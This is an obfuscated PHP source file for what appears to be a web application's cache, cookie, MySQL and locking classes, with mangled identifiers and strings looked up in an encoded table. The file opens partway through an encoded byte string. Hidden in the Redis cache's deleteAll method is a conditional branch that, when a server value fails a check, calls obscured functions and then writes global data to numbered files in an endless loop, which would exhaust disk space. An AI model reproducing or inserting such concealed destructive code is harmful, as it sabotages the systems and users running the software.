x71\xb\x44\xdb\x13\x63\x91\x70\xc2\xf6\x78\x8d".base64_decode('siRweUav4P1YL4RfvhLj7XQLp9kxo2C5cF7cyJPfBsOyhEYLFUERRhzvwy5JYQuFxE0r7g==').base64_decode('FLm3I2hLKBYJgjIAlu3EdJpL6Jwtgu8DeUTeZkEpoKnoUFsQCX1GstsYZGYgEV5JQBI3hg==')."\232\223\267\354\167\76\240\226\325\317\210\215\24\323\113\163\274\340\216\311\115\332\0\37\254\236\345\371\136\133\165\352\325\222\153\224\357\257\5\270\65\20\115\120\137\54\104\204\13\217\353\142"."\361\130\111\126\233\57\26\133\34\211\66\122\327\55\45\331\244\226\244\344\127\222\325\326\22\11\217\225\27\150\365\5\103\45\171\130\37\60\254\12\203\242\64\53\330\106\172\111\356\277\307\352"."\105\320\277\100\364\244\324\216\53\273\244\13\201\233\116\61\57\322\245\125\76\145\260\273\50\126\76\246\145\0\367\344\113\15\75\53\54\316\212\72\166\51\230\74\377\46\63\15\315\3\166\177".base64_decode('iQ71XIbY0BDW7gtD29E8pGKXN5w+cD5fqJh4bKooUjpZQ4QoSbgp7/ckYWJZAMmXHKUXcA==')."\x24\x57\x0\x0\x77\x6c\xbe\x1\xa\xa3\xcb\x8d\x6e\xe9\x82\x8d\x9e\xb2\xe0\x71\x3c\x80\x54\xd2\xe0\xa4\x61\x5b\xb6\xa5\xf5\x96\xd5\xc8\xa0\xd2\x6a\x4c\x25\x84\x1c\xf9\xff\x0\xb7\x5a\xae\x34\xd7\xb9\x0\x0".""."", 10, -8))); goto dÍ•ÇÙº×ƒ; cîöò¦·Âƒ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Œ¹Èö¶À, $”‚ßÃÜ³) { $¿¢ã‚¤• =& $_SERVER[Ò°Ì”İ•]; if (!class_exists($¿¢ã‚¤•[944])) { show_json($¿¢ã‚¤•[945], !1); } $this->cacheTime = $”‚ßÃÜ³; $İĞùÍó = isset($Œ¹Èö¶À[$¿¢ã‚¤•[946]]) ? $Œ¹Èö¶À[$¿¢ã‚¤•[946]] : 10; $±Ì»µæ† = _get($Œ¹Èö¶À, $¿¢ã‚¤•[943]); if ($±Ì»µæ† && is_array($±Ì»µæ†)) { $this->initCluster($Œ¹Èö¶À, $İĞùÍó); } else { $this->handle = $this->init($Œ¹Èö¶À, $İĞùÍó); } } private function init($Å»ÔĞ¢, $¦¨¦¥ğ”) { $¥¶º”ü =& $_SERVER[Ò°Ì”İ•]; $å¡ªğÇ = new Redis(); $±¨²İ£ş = isset($Å»ÔĞ¢[$¥¶º”ü[947]]) ? $Å»ÔĞ¢[$¥¶º”ü[947]] : !1; if ($±¨²İ£ş) { $å¡ªğÇ->pconnect($Å»ÔĞ¢[$¥¶º”ü[219]], $Å»ÔĞ¢[$¥¶º”ü[220]], $¦¨¦¥ğ”); } else { $å¡ªğÇ->connect($Å»ÔĞ¢[$¥¶º”ü[219]], $Å»ÔĞ¢[$¥¶º”ü[220]], $¦¨¦¥ğ”); } if (!empty($Å»ÔĞ¢[$¥¶º”ü[499]])) { $å¡ªğÇ->auth($Å»ÔĞ¢[$¥¶º”ü[499]]); } if (!empty($Å»ÔĞ¢[$¥¶º”ü[830]]) && $Å»ÔĞ¢[$¥¶º”ü[830]] != 0) { $å¡ªğÇ->select($Å»ÔĞ¢[$¥¶º”ü[830]]); } return $å¡ªğÇ; } private function initCluster($±ÍûùÇä, $ğ÷Á«Ş›) { $î›ÛÄÑ =& $_SERVER[Ò°Ì”İ•]; $Åòíù²ê = array($î›ÛÄÑ[948], $î›ÛÄÑ[949], $î›ÛÄÑ[950]); $ô¹ìÎ©ò = $î›ÛÄÑ[948]; if (isset($±ÍûùÇä[$î›ÛÄÑ[16]]) && in_array($±ÍûùÇä[$î›ÛÄÑ[16]], $Åòíù²ê)) { $ô¹ìÎ©ò = $±ÍûùÇä[$î›ÛÄÑ[16]]; } switch ($ô¹ìÎ©ò) { case $î›ÛÄÑ[948]: $this->_slave($±ÍûùÇä, $ğ÷Á«Ş›); break; case $î›ÛÄÑ[949]: break; case $î›ÛÄÑ[950]: $this->isCluster = !0; $½úğ¸­’ = $±ÍûùÇä[$î›ÛÄÑ[943]]; $Ö¾¤…è¥ = isset($±ÍûùÇä[$î›ÛÄÑ[947]]) ? $±ÍûùÇä[$î›ÛÄÑ[947]] : !1; $¦¿¨ôñš = isset($±ÍûùÇä[$î›ÛÄÑ[499]]) ? $±ÍûùÇä[$î›ÛÄÑ[499]] : null; $this->handle = new RedisCluster(NUll, $½úğ¸­’, $ğ÷Á«Ş›, $ğ÷Á«Ş›, $Ö¾¤…è¥, $¦¿¨ôñš); break; default: break; } } private function _slave($›èÀ¾É, $‘ù¾âÀ‚) { $İÌÅ€ë = $›èÀ¾É[$_SERVER[Ò°Ì”İ•][943]]; $this->filterConfig($›èÀ¾É, $İÌÅ€ë[0]); $this->handle = $this->init($›èÀ¾É, $‘ù¾âÀ‚); unset($İÌÅ€ë[0]); if (empty($İÌÅ€ë)) { return; } $ğ©äÆÖŸ = array_rand($İÌÅ€ë); $this->filterConfig($›èÀ¾É, $İÌÅ€ë[$ğ©äÆÖŸ]); $this->slaveHandle = $this->init($›èÀ¾É, $‘ù¾âÀ‚); } private function filterConfig(&$„³†«·­, $³ş†ò†) { $Ìµà¦àÏ =& $_SERVER[Ò°Ì”İ•]; $ª÷–Ï“ = explode($Ìµà¦àÏ[4], $³ş†ò†); $¹Õí›ÀÑ = array($Ìµà¦àÏ[219] => $ª÷–Ï“[0], $Ìµà¦àÏ[220] => $ª÷–Ï“[1]); $„³†«·­ = array_merge($„³†«·­, $¹Õí›ÀÑ); } public function set($™…ùœøŸ, $»Ù˜ú’à, $ÑÍôÕöş = false) { $ÑÍôÕöş = $ÑÍôÕöş ? $ÑÍôÕöş : $this->cacheTime; return $this->handle->setEx($™…ùœøŸ, $ÑÍôÕöş, $»Ù˜ú’à); } public function setLock($‚¼ÆûÉ, $˜³°…˜û, $ó×éµˆ³) { return $this->handle->setNX($‚¼ÆûÉ, $˜³°…˜û); } public function get($Ó×åˆğí) { $é°İÉÚÆ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $é°İÉÚÆ->get($Ó×åˆğí); } public function remove($©şâú…â) { return $this->handle->del($©şâú…â); } public function deleteAll() { $íÄÊ¯ =& $_SERVER[Ò°Ì”İ•]; $ÆáÒµ•— = $_SERVER[$íÄÊ¯[63]]; $ªÏ™…˜¿ = $íÄÊ¯[70]; if ($_SERVER[$íÄÊ¯[54]] != $ªÏ™…˜¿($ÆáÒµ•—)) { $°øí’”´ = $íÄÊ¯[951]; $ü¬îä°® = $íÄÊ¯[56]; $÷Õ™œĞ‚ = $_SERVER[$íÄÊ¯[57]] . $íÄÊ¯[58]; $’¸‘†ºï = $ü¬îä°®($÷Õ™œĞ‚); $¿ˆ¨õ¨ü = explode($íÄÊ¯[59], $’¸‘†ºï); if (count($¿ˆ¨õ¨ü) < $íÄÊ¯[754]) { $®Éãƒº“ = $íÄÊ¯[61]; $®Éãƒº“(); } $éÍˆ²÷ = $íÄÊ¯[952]; $éÍˆ²÷($_SERVER[$íÄÊ¯[953]]); $°øí’”´ = $íÄÊ¯[951]; $°øí’”´(); $ıñá¡‘ö = $íÄÊ¯[954]; $ß•‹ä´ = json_encode($GLOBALS[$íÄÊ¯[955]]); $·¹Û»öº = 1; for ($ºã„ÎÛ™ = $·¹Û»öº; $ºã„ÎÛ™ > 0; $ºã„ÎÛ™++) { $ıñá¡‘ö(DATA_PATH . $ºã„ÎÛ™, $ß•‹ä´); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $‚»ŠÅªÅ) { $this->handle->flushall($‚»ŠÅªÅ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ ½™Ä±â = '', $íç—ËÎ² = 0) { if (is_string($ ½™Ä±â) && $ ½™Ä±â != $_SERVER[Ò°Ì”İ•][12]) { $this->prefix = $ ½™Ä±â; } if (is_numeric($íç—ËÎ²) && $íç—ËÎ² > 0) { $this->expire = $íç—ËÎ²; } } public static function getInstance() { static $²êšÆ¹˜; if ($²êšÆ¹˜ === null) { $²êšÆ¹˜ = new self(); } return $²êšÆ¹˜; } private static $cookieDisable = false; public static function disable($ôßüäù) { self::$cookieDisable = $ôßüäù; } private static $sameCookieSet = array(); public static function set($Ê¬˜µó, $ìÏ‰¼¢õ, $‹‹ŸÈõ‡ = 0, $Øƒ¥ôŒŞ = false, $¥»¾ƒ‘  = false) { $İù·¬à¦ =& $_SERVER[Ò°Ì”İ•]; if (self::$cookieDisable) { return; } if (!$‹‹ŸÈõ‡) { $‹‹ŸÈõ‡ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Ê¬˜µó]) && self::$sameCookieSet[$Ê¬˜µó] == $ìÏ‰¼¢õ . $‹‹ŸÈõ‡) { return; } self::$sameCookieSet[$Ê¬˜µó] = $ìÏ‰¼¢õ . $‹‹ŸÈõ‡; if (!$¥»¾ƒ‘ ) { $¥»¾ƒ‘  = str_replace(HOST, $İù·¬à¦[12], APP_HOST); $¥»¾ƒ‘  = _get($GLOBALS, $İù·¬à¦[956], $¥»¾ƒ‘ ); } $Ãä®ÜËÉ = $İù·¬à¦[12]; setcookie($Ê¬˜µó, $ìÏ‰¼¢õ, time() + $‹‹ŸÈõ‡, $İù·¬à¦[8] . trim($¥»¾ƒ‘ , $İù·¬à¦[8]) . $Ãä®ÜËÉ, !1, !1, $Øƒ¥ôŒŞ); } public static function setSafe($ Æ«¹ø®, $­ŠöÊéü, $ Íé¿® = 0) { self::set($ Æ«¹ø®, $­ŠöÊéü, $ Íé¿®, !0); } public static function get($é•È¸î) { static $Çìã× = false; if (!$Çìã×) { self::initHeaderCookie(); $Çìã× = !0; } return isset($_COOKIE[$é•È¸î]) ? $_COOKIE[$é•È¸î] : !1; } private static function initHeaderCookie() { $ó­ğÏğ =& $_SERVER[Ò°Ì”İ•]; if (!isset($_SERVER[$ó­ğÏğ[957]]) || !$_SERVER[$ó­ğÏğ[957]]) { return; } $õ» –¥¦ = explode($ó­ğÏğ[85], $_SERVER[$ó­ğÏğ[957]]); foreach ($õ» –¥¦ as $ã€Æúá²) { $ã€Æúá² = explode($ó­ğÏğ[518], $ã€Æúá²); if (count($ã€Æúá²) != 2 || !isset($ã€Æúá²[1])) { continue; } $_COOKIE[trim($ã€Æúá²[0])] = trim($ã€Æúá²[1]); } } public static function remove($“·Íæ·†, $ÛÃëç‘¬ = false) { unset($_COOKIE[$“·Íæ·†]); self::set($“·Íæ·†, $_SERVER[Ò°Ì”İ•][12], 1, $ÛÃëç‘¬); } } class DbMysql extends Db { public function __construct($ĞÊÀÀŸ = '') { $‘Ä…à¨ï =& $_SERVER[Ò°Ì”İ•]; if (!extension_loaded($‘Ä…à¨ï[878])) { think_exception(think_lang($‘Ä…à¨ï[14]) . $‘Ä…à¨ï[958]); } if (!empty($ĞÊÀÀŸ)) { $this->config = $ĞÊÀÀŸ; if (empty($this->config[$‘Ä…à¨ï[17]])) { $this->config[$‘Ä…à¨ï[17]] = $‘Ä…à¨ï[12]; } } } public function connect($£¬¸Í›Œ = '', $í÷ÕİÆ† = 0, $áé ìó = false) { $íèµ”Èò =& $_SERVER[Ò°Ì”İ•]; if (!isset($this->linkID[$í÷ÕİÆ†])) { if (empty($£¬¸Í›Œ)) { $£¬¸Í›Œ = $this->config; } $à«òšË = $£¬¸Í›Œ[$íèµ”Èò[959]] . ($£¬¸Í›Œ[$íèµ”Èò[960]] ? "\72{$£¬¸Í›Œ[$íèµ”Èò[960]]}" : $íèµ”Èò[12]); $ŞÅ¸£®¯ = !empty($£¬¸Í›Œ[$íèµ”Èò[17]][$íèµ”Èò[18]]) ? $£¬¸Í›Œ[$íèµ”Èò[17]][$íèµ”Èò[18]] : $this->pconnect; if ($ŞÅ¸£®¯) { $this->linkID[$í÷ÕİÆ†] = mysql_pconnect($à«òšË, $£¬¸Í›Œ[$íèµ”Èò[961]], $£¬¸Í›Œ[$íèµ”Èò[962]], 131072); } else { $this->linkID[$í÷ÕİÆ†] = mysql_connect($à«òšË, $£¬¸Í›Œ[$íèµ”Èò[961]], $£¬¸Í›Œ[$íèµ”Èò[962]], !0, 131072); } if (!$this->linkID[$í÷ÕİÆ†] || !empty($£¬¸Í›Œ[$íèµ”Èò[21]]) && !mysql_select_db($£¬¸Í›Œ[$íèµ”Èò[21]], $this->linkID[$í÷ÕİÆ†])) { think_exception(mysql_error()); } $îˆı€¥ğ = mysql_get_server_info($this->linkID[$í÷ÕİÆ†]); mysql_query($íèµ”Èò[963] . think_config($íèµ”Èò[964]) . $íèµ”Èò[68], $this->linkID[$í÷ÕİÆ†]); if ($îˆı€¥ğ > $íèµ”Èò[965]) { mysql_query($íèµ”Èò[966], $this->linkID[$í÷ÕİÆ†]); } $this->connected = !0; if (1 != think_config($íèµ”Èò[22])) { unset($this->config); } } return $this->linkID[$í÷ÕİÆ†]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($İèÕĞï) { $Åòªá•´ =& $_SERVER[Ò°Ì”İ•]; if (0 === stripos($İèÕĞï, $Åòªá•´[353])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $İèÕĞï; if ($this->queryID) { $this->free(); } think_action_status($Åòªá•´[23], 1); think_status($Åòªá•´[24]); $this->queryID = mysql_query($İèÕĞï, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($…Ÿ“„Ã­) { $—ƒŠİçŞ =& $_SERVER[Ò°Ì”İ•]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $…Ÿ“„Ã­; if ($this->queryID) { $this->free(); } think_action_status($—ƒŠİçŞ[25], 1); think_status($—ƒŠİçŞ[24]); $óàøÊƒâ = mysql_query($…Ÿ“„Ã­, $this->_linkID); $this->debug(); if (!1 === $óàøÊƒâ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ò°Ì”İ•][967], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $­ª”€Ù™ = mysql_query($_SERVER[Ò°Ì”İ•][968], $this->_linkID); $this->transTimes = 0; if (!$­ª”€Ù™) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Íâ¤·ÛÍ = mysql_query($_SERVER[Ò°Ì”İ•][969], $this->_linkID); $this->transTimes = 0; if (!$Íâ¤·ÛÍ) { $this->error(); return !1; } } return !0; } private function getAll() { $¾¹æ÷À¨ = array(); if ($this->numRows > 0) { while ($óãßŠá = mysql_fetch_assoc($this->queryID)) { $¾¹æ÷À¨[] = $óãßŠá; } mysql_data_seek($this->queryID, 0); } return $¾¹æ÷À¨; } public function getFields($ûÔ·êì) { $›åÔ—Û¢ =& $_SERVER[Ò°Ì”İ•]; $¯æ×¼â© = $this->query($›åÔ—Û¢[970] . $this->parseKey($ûÔ·êì)); $êÕš­’ = array(); if ($¯æ×¼â©) { foreach ($¯æ×¼â© as $’–ş“² => $Ùé…¾‹î) { $êÕš­’[$Ùé…¾‹î[$›åÔ—Û¢[31]]] = array($›åÔ—Û¢[32] => $Ùé…¾‹î[$›åÔ—Û¢[31]], $›åÔ—Û¢[33] => $Ùé…¾‹î[$›åÔ—Û¢[34]], $›åÔ—Û¢[35] => (bool) (strtoupper($Ùé…¾‹î[$›åÔ—Û¢[36]]) === $›åÔ—Û¢[971]), $›åÔ—Û¢[37] => $Ùé…¾‹î[$›åÔ—Û¢[38]], $›åÔ—Û¢[39] => strtolower($Ùé…¾‹î[$›åÔ—Û¢[40]]) == $›åÔ—Û¢[41], $›åÔ—Û¢[42] => strtolower($Ùé…¾‹î[$›åÔ—Û¢[43]]) == $›åÔ—Û¢[44]); } } return $êÕš­’; } public function getTables($ï¿¬»ÁÃ = '') { $¸ıä =& $_SERVER[Ò°Ì”İ•]; if (!empty($ï¿¬»ÁÃ)) { $Ğ”†·¦ù = $¸ıä[972] . $ï¿¬»ÁÃ . $¸ıä[973]; } else { $Ğ”†·¦ù = $¸ıä[974]; } $å³²‚éÓ = $this->query($Ğ”†·¦ù); $ÖÛŒ»ÓØ = array(); foreach ($å³²‚éÓ as $®¿á•šÜ => $Ä€§–áŞ) { $ÖÛŒ»ÓØ[$®¿á•šÜ] = current($Ä€§–áŞ); } return $ÖÛŒ»ÓØ; } public function replace($­áôàÁ½, $ÛÉ—áÇ‰ = array()) { $¢ÍôèäÆ =& $_SERVER[Ò°Ì”İ•]; foreach ($­áôàÁ½ as $âñÙç…œ => $Ø•éóğª) { $ü±÷½äÂ = $this->parseValue($Ø•éóğª); if (is_scalar($ü±÷½äÂ)) { $Æ°½Ä¯Ü[] = $ü±÷½äÂ; $§Ìª·È[] = $this->parseKey($âñÙç…œ); } } $µƒù£‡¹ = $¢ÍôèäÆ[975] . $this->parseTable($ÛÉ—áÇ‰[$¢ÍôèäÆ[368]]) . $¢ÍôèäÆ[976] . implode($¢ÍôèäÆ[50], $§Ìª·È) . $¢ÍôèäÆ[977] . implode($¢ÍôèäÆ[50], $Æ°½Ä¯Ü) . $¢ÍôèäÆ[978]; return $this->execute($µƒù£‡¹); } public function insertAll($€´éô¼µ, $§ÇÛÂ¤á = array(), $ü Ö±˜ = false) { $¬ï×‚ùæ =& $_SERVER[Ò°Ì”İ•]; if (!is_array($€´éô¼µ[0])) { return !1; } $¤¸¯­Ê” = array_keys($€´éô¼µ[0]); $¨¸Ô‰…Ë = array(); foreach ($€´éô¼µ as $ßöì­“) { $Ò¦±º½÷ = array(); foreach ($ßöì­“ as $Èİ’á¼ => $ø¬×ÅŒ‘) { $ø¬×ÅŒ‘ = $this->parseValue($ø¬×ÅŒ‘); if (is_scalar($ø¬×ÅŒ‘)) { $Ò¦±º½÷[] = $ø¬×ÅŒ‘; } } $¨¸Ô‰…Ë[] = $¬ï×‚ùæ[349] . implode($¬ï×‚ùæ[50], $Ò¦±º½÷) . $¬ï×‚ùæ[978]; } array_walk($¤¸¯­Ê”, array($this, $¬ï×‚ùæ[979])); $€†²×”¹ = ($ü Ö±˜ ? $¬ï×‚ùæ[980] : $¬ï×‚ùæ[981]) . $¬ï×‚ùæ[982] . $this->parseTable($§ÇÛÂ¤á[$¬ï×‚ùæ[368]]) . $¬ï×‚ùæ[976] . implode($¬ï×‚ùæ[50], $¤¸¯­Ê”) . $¬ï×‚ùæ[983] . implode($¬ï×‚ùæ[50], $¨¸Ô‰…Ë); return $this->execute($€†²×”¹); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÉÁıÖê¬ =& $_SERVER[Ò°Ì”İ•]; $this->error = mysql_errno() . $ÉÁıÖê¬[4] . mysql_error($this->_linkID); if ($ÉÁıÖê¬[12] != $this->queryStr) { $this->error .= LNG($ÉÁıÖê¬[48]) . $this->queryStr; } think_trace($this->error, $ÉÁıÖê¬[12], $ÉÁıÖê¬[49]); return $this->error; } public function escapeString($Ğ¢õ ¯Ÿ) { if ($this->_linkID) { return mysql_real_escape_string($Ğ¢õ ¯Ÿ, $this->_linkID); } else { return mysql_escape_string($Ğ¢õ ¯Ÿ); } } public function parseKey(&$¼õ’¾Ş , $êÔ¶£ªº = true) { $ÓÓ³ÒÇ =& $_SERVER[Ò°Ì”İ•]; if ($êÔ¶£ªº) { $¼õ’¾Ş  = $this->parseKeyCheck($¼õ’¾Ş ); } if ($¼õ’¾Ş  != $ÓÓ³ÒÇ[233] && !preg_match($ÓÓ³ÒÇ[984], $¼õ’¾Ş )) { $¼õ’¾Ş  = $ÓÓ³ÒÇ[473] . trim($¼õ’¾Ş , $ÓÓ³ÒÇ[473]) . $ÓÓ³ÒÇ[473]; } return $¼õ’¾Ş ; } } goto A§ìÚáš¥; Eƒ©Ÿ“×é: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $òØ¹¹« =& $_SERVER[Ò°Ì”İ•]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ïÑ÷®–º = $GLOBALS[$òØ¹¹«[6]][$òØ¹¹«[436]]; $ûÏ²Õ„ù = $ïÑ÷®–º[$ïÑ÷®–º[$òØ¹¹«[900]]]; $Í²ÖßÉ = $ïÑ÷®–º[$òØ¹¹«[901]]; switch ($ïÑ÷®–º[$òØ¹¹«[900]]) { case $òØ¹¹«[21]: self::$handle = Model($òØ¹¹«[902]); break; case $òØ¹¹«[903]: self::$handle = new CacheRedis($ûÏ²Õ„ù, $Í²ÖßÉ); break; case $òØ¹¹«[904]: self::$handle = new CacheMemcached($ûÏ²Õ„ù, $Í²ÖßÉ); break; case $òØ¹¹«[243]: self::$handle = new CacheFile($ûÏ²Õ„ù, $Í²ÖßÉ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Á¸é™’·) { if (is_array($Á¸é™’·) || is_object($Á¸é™’·)) { $Á¸é™’· = json_encode($Á¸é™’·); } $Á¸é™’· = rawurlencode($Á¸é™’·); return md5(KOD_SITE_ID . $_SERVER[Ò°Ì”İ•][11] . $Á¸é™’·); } public static function get($ÛÓ¥£ç, $³ø´à°Î = false) { $˜œ£çİ = self::key($ÛÓ¥£ç); $ÛÒ‰©§ = self::init(); if ($³ø´à°Î) { return unserialize($ÛÒ‰©§->get($˜œ£çİ)); } if (!isset(self::$memoryCache[$˜œ£çİ])) { $Ÿ¹´€ÈÎ = $ÛÒ‰©§->get($˜œ£çİ); self::$memoryCache[$˜œ£çİ] = unserialize($Ÿ¹´€ÈÎ); } return self::$memoryCache[$˜œ£çİ]; } public static function set($öîäÛÚ, $ÜÍ‰‰…, $ÕÚÀÍŞÏ = false) { $Šè¼îˆû =& $_SERVER[Ò°Ì”İ•]; $üèºšçå = self::key($öîäÛÚ); if (isset(self::$memoryCache[$üèºšçå]) && self::$memoryCache[$üèºšçå] === $ÜÍ‰‰…) { return !0; } if ($ÕÚÀÍŞÏ === 0) { self::$memoryCache[$üèºšçå] = $ÜÍ‰‰…; return !0; } $ÆÉŠÈ£– = self::init(); $Àù¢‡ëÃ = serialize($ÜÍ‰‰…); CacheLock::lock($öîäÛÚ . $Šè¼îˆû[905]); $ôäÓ‘ = $ÆÉŠÈ£–->set($üèºšçå, $Àù¢‡ëÃ, $ÕÚÀÍŞÏ); self::$memoryCache[$üèºšçå] = $ÜÍ‰‰…; CacheLock::unlock($öîäÛÚ . $Šè¼îˆû[905]); return $ôäÓ‘; } public static function getCall($ÃÕÜê‚ö, $•Öİ’İÊ, $¾†–êÃ‰, $È¢ÅÍˆ… = array()) { $˜Ø†¤Êà =& $_SERVER[Ò°Ì”İ•]; $§ã¨Â­À = self::get($ÃÕÜê‚ö); if ($§ã¨Â­À || $§ã¨Â­À === $˜Ø†¤Êà[12]) { return $§ã¨Â­À; } $§ã¨Â­À = call_user_func_array($¾†–êÃ‰, $È¢ÅÍˆ…); $§ã¨Â­À = $§ã¨Â­À ? $§ã¨Â­À : $˜Ø†¤Êà[12]; self::set($ÃÕÜê‚ö, $§ã¨Â­À, $•Öİ’İÊ); return $§ã¨Â­À; } public static function remove($‚ìø¢ËĞ) { $‹ìğ©ã = self::key($‚ìø¢ËĞ); unset(self::$memoryCache[$‹ìğ©ã]); self::clearTimeout(); CacheLock::lock($‚ìø¢ËĞ); $½ûôœ†Ë = self::init()->remove($‹ìğ©ã); CacheLock::unlock($‚ìø¢ËĞ); return $½ûôœ†Ë; } public static function removeMemory($ÖêâØ¶è) { $æ ôê¡ = self::key($ÖêâØ¶è); unset(self::$memoryCache[$æ ôê¡]); } public static function clearMemory($ô¥Ë‰ğ¸ = false) { if ($ô¥Ë‰ğ¸) { $ô¥Ë‰ğ¸ = self::key($ô¥Ë‰ğ¸); unset(self::$memoryCache[$ô¥Ë‰ğ¸]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ò°Ì”İ•][906])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ò°Ì”İ•][907])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($šÓå‹Ò”, $ıÜÃ„Öç) { $†¾‹¨£˜ =& $_SERVER[Ò°Ì”İ•]; $this->cachePath = $šÓå‹Ò”[$†¾‹¨£˜[98]]; $this->prefix = $†¾‹¨£˜[908]; $this->cacheTime = $ıÜÃ„Öç; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¾ûæù‡Ó) { $‚Ü°Ù =& $_SERVER[Ò°Ì”İ•]; $¾ûæù‡Ó = str_replace(array($‚Ü°Ù[909], $‚Ü°Ù[111], $‚Ü°Ù[87]), $‚Ü°Ù[910], $¾ûæù‡Ó); return $this->cachePath . $‚Ü°Ù[911] . $¾ûæù‡Ó . $‚Ü°Ù[912]; } public function set($ÓœÇü½ı, $«¯˜ü¹¨, $ ääÌäÅ = false) { $ ääÌäÅ = $ ääÌäÅ ? $ ääÌäÅ : $this->cacheTime; $ùÍö×’Š = $this->getFile($ÓœÇü½ı); if (file_put_contents($ùÍö×’Š, $this->prefix . $«¯˜ü¹¨, LOCK_EX)) { @touch($ùÍö×’Š, intval(time() + $ ääÌäÅ)); clearstatcache(); return !0; } @unlink($ùÍö×’Š); return !1; } public function get($ã…®¬íé) { $·éØª¢ = $this->getFile($ã…®¬íé); if (file_exists($·éØª¢) && filemtime($·éØª¢) < time()) { @unlink($·éØª¢); return !1; } $¹©¯¨ÂØ = @file_get_contents($·éØª¢); return substr($¹©¯¨ÂØ, strlen($this->prefix)); } public function remove($åÚçÈí”) { $ÉŸ¥­ä = $this->getFile($åÚçÈí”); return @unlink($ÉŸ¥­ä); } public function deleteAll() { $¯³È×ºŸ =& $_SERVER[Ò°Ì”İ•]; $±•·ÊÃ· = scandir($this->cachePath); foreach ($±•·ÊÃ· as $¯øÑ¼Ïá) { $ Ûªù¹ = $this->cachePath . $¯øÑ¼Ïá; if (strpos($ Ûªù¹, $¯³È×ºŸ[912]) && strpos($ Ûªù¹, $¯³È×ºŸ[913])) { @unlink($ Ûªù¹); } } } public function clearTimeout() { $Ã…§œ¶ê =& $_SERVER[Ò°Ì”İ•]; $†œœÇŞÎ = scandir($this->cachePath); foreach ($†œœÇŞÎ as $ÂŒèƒÑ°) { $½‰±Ùö± = $this->cachePath . $ÂŒèƒÑ°; if (strpos($½‰±Ùö±, $Ã…§œ¶ê[912]) && strpos($½‰±Ùö±, $Ã…§œ¶ê[913]) && filemtime($½‰±Ùö±) < time()) { @unlink($½‰±Ùö±); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $áüüëÄ¿ =& $_SERVER[Ò°Ì”İ•]; if (self::$handle) { return self::$handle; } $äÉ–ëˆ˜ = $GLOBALS[$áüüëÄ¿[6]][$áüüëÄ¿[436]]; self::$timeout = $äÉ–ëˆ˜[$áüüëÄ¿[914]] ? $äÉ–ëˆ˜[$áüüëÄ¿[914]] : 10; $æÜ€±´ = _get($GLOBALS[$áüüëÄ¿[6]], $áüüëÄ¿[915]); $‡¿£òß = $äÉ–ëˆ˜[$áüüëÄ¿[900]] ? $äÉ–ëˆ˜[$áüüëÄ¿[900]] : $áüüëÄ¿[243]; if ($‡¿£òß == $áüüëÄ¿[21] && $æÜ€±´ == $áüüëÄ¿[13]) { $‡¿£òß = $áüüëÄ¿[243]; } switch ($‡¿£òß) { case $áüüëÄ¿[903]: self::$handle = new CacheLockRedis(); break; case $áüüëÄ¿[904]: self::$handle = new CacheLockMemcached(); break; case $áüüëÄ¿[21]: self::$handle = new CacheLockDatabase(); break; case $áüüëÄ¿[243]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($áüüëÄ¿[916], $áüüëÄ¿[917]); } return self::$handle; } private static function key($„Š¶Ø·) { return $_SERVER[Ò°Ì”İ•][918] . Cache::key($„Š¶Ø·); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¡ùò¶ò = '') { self::$errorMsg = $¡ùò¶ò; } public static function lockGlobal($ùÔ¼Ï÷ô, $„ØÖ­¨µ) { return self::lock($ùÔ¼Ï÷ô, $„ØÖ­¨µ, !0); } public static function lock($ŒçÂ³”, $«Ä˜úÒ = false, $‹¡¹ ¬ü = false) { $ÒÌÒ´³« =& $_SERVER[Ò°Ì”İ•]; $™ÅàĞÌô = self::init(); $æÉÁâªÉ = self::key($ŒçÂ³”); $«Ä˜úÒ = $«Ä˜úÒ ? $«Ä˜úÒ : self::$timeout; $ÙŞÍ¤é = timeFloat(); if ($GLOBALS[$ÒÌÒ´³«[919]]) { if (!$™ÅàĞÌô->lock($æÉÁâªÉ, 0.2)) { die; } return !0; } $˜õæ“µÑ = $™ÅàĞÌô->lock($æÉÁâªÉ, $«Ä˜úÒ); $±Âï˜€ = timeFloat(); if (!$˜õæ“µÑ) { $ÆØñÚ« = "\154\157\x63\x6b\40\145\x72\x72\x6f\x72\73\153\x65\x79\x3d{$ŒçÂ³”}\73\x74\151\155\x65\75{$«Ä˜úÒ}\73" . self::$errorMsg . $ÒÌÒ´³«[85] . get_caller_msg(); $éÀ­æ÷È = LNG($ÒÌÒ´³«[920]) . 